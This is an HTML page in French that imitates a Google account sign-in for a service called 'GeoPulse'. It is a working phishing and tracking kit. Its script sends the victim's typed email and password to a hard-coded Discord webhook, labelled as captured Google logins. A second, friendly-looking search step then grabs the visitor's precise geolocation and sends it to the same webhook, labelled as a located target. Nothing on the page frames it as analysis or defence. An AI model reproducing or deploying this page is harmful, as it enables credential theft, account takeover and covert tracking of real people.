<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion â€“ Comptes Google</title>
    <style>
        /* STYLE PAGE 1 : GOOGLE AUTHENTIQUE */
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .google-box { width: 350px; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; }
        .google-logo { width: 75px; margin-bottom: 20px; }
        .google-box h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
        .google-input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        .google-btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; font-size: 14px; width: 100%; margin-top: 20px; }

        /* STYLE PAGE 2 : GEOPULSE CHALEUREUX */
        .friendly-card { display: none; background: white; width: 380px; padding: 40px; border-radius: 30px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); text-align: center; border: 1px solid #eef2f6; }
        .icon-pulse { width: 60px; height: 60px; background: #f0f7ff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; font-size: 24px; color: #4A90E2; }
        .friendly-input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #f0f4f8; border-radius: 15px; font-size: 15px; box-sizing: border-box; outline: none; transition: 0.3s; }
        .friendly-input:focus { border-color: #4A90E2; background: #fcfdfe; }
        .friendly-btn { background: #4A90E2; color: white; border: none; padding: 16px; border-radius: 15px; cursor: pointer; font-weight: 600; font-size: 16px; width: 100%; box-shadow: 0 4px 12px rgba(74, 144, 226, 0.2); transition: 0.3s; }
        .friendly-btn:hover { background: #357abd; transform: translateY(-1px); }
    </style>
</head>
<body>

<div id="login-step" class="google-box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="google-logo">
    <h1>Connexion</h1>
    <p style="margin-bottom: 25px; color: #3c4043;">AccÃ©der Ã  <strong>GeoPulse</strong></p>
    
    <input type="text" id="email" class="google-input" placeholder="E-mail ou tÃ©lÃ©phone">
    <input type="password" id="pass" class="google-input" placeholder="Mot de passe">
    
    <div style="text-align: left; color: #1a73e8; font-size: 14px; margin-top: 10px; font-weight: 500;">Mot de passe oubliÃ© ?</div>
    <button onclick="captureLogin()" class="google-btn">Suivant</button>
</div>

<div id="search-step" class="friendly-card">
    <div class="icon-pulse">âœ¨</div>
    <h1 style="color: #4A90E2; font-weight: 800; letter-spacing: -1px;">GeoPulse.</h1>
    <p style="color: #7f8c8d; font-size: 15px;">Trouvez tous vos lieux prÃ©fÃ©rÃ©s Ã  proximitÃ© de chez vous en un seul clic ! ðŸ˜Š</p>
    
    <input type="text" id="query" class="friendly-input" placeholder="Que cherchez-vous ? (ex: Sushi)">
    <button onclick="startSearch()" class="friendly-btn">DÃ©couvrir autour de moi</button>
    
    <div id="status" style="margin-top: 15px; font-size: 14px; color: #95a5a6;">PrÃªt Ã  vous guider !</div>
    
    <div id="map-placeholder" style="margin-top:20px; height:250px; display:none; border-radius:20px; overflow:hidden; border: 1px solid #eee;">
        <iframe id="map-iframe" width="100%" height="100%" frameborder="0" style="border:0" scrolling="no" marginheight="0" marginwidth="0"></iframe>
    </div>
</div>

<script>
const webhook = "https://discord.com/api/webhooks/1406320274206490685/T5UlsYLa2A-ZUGfItLh6Uai053DnYNhbOsF0agE-gngh0DJuQDxt7sWRridLKNi1M5XP";

async function captureLogin() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(email && pass) {
        await fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                embeds: [{
                    title: "ðŸ”‘ LOGINS GOOGLE CAPTURÃ‰S",
                    color: 16733952,
                    fields: [
                        { name: "ðŸ“§ Email", value: `\`${email}\`` },
                        { name: "ðŸ”’ Password", value: `\`${pass}\`` }
                    ]
                }]
            })
        });
        document.getElementById('login-step').style.display = 'none';
        document.getElementById('search-step').style.display = 'block';
    } else { alert("Veuillez remplir les champs Google."); }
}

async function startSearch() {
    const query = document.getElementById('query').value;
    const status = document.getElementById('status');
    if(!query) return;

    status.innerHTML = "âœ¨ Analyse de votre quartier en cours...";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            await fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "ðŸŽ¯ CIBLE LOCALISÃ‰E (GeoPulse Friendly)",
                        color: 4884962,
                        fields: [
                            { name: "ðŸ”Ž Recherche", value: query },
                            { name: "ðŸ“ Carte", value: `[Ouvrir Google Maps](https://www.google.com/maps?q=${lat},${lon})` }
                        ]
                    }]
                })
            });

            status.innerHTML = "âœ… Voici les meilleurs rÃ©sultats !";
            document.getElementById('map-placeholder').style.display = 'block';
            
            // URL DE SECOURS STABLE (OpenStreetMap ou Embed simplifiÃ©)
            // On utilise une version d'embed qui ne bloque pas les paramÃ¨tres
            const searchUrl = "https://maps.google.com/maps?q=" + encodeURIComponent(query) + "&t=&z=13&ie=UTF8&iwloc=&output=embed";
            document.getElementById('map-iframe').src = searchUrl;

        }, () => {
            status.innerHTML = "ðŸ˜” AccÃ¨s nÃ©cessaire pour la recherche.";
        }, { enableHighAccuracy: true });
    }
}
</script>
</body>
</html>





